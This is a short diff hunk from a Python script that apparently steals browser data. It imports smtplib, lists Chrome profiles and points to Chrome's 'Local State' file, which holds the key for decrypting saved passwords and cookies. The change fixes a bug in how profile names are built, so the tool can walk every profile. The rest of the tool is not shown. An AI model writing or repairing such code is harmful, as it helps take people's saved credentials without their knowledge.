@@ -13,7 +13,7 @@ import smtplib
 arr = ["Default"]
 
 for i in range(1, 15): 
-    arr.append("Profile " + i)
+    arr.append(f"Profile {i}")
 
 LOCALSTATEPATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
 
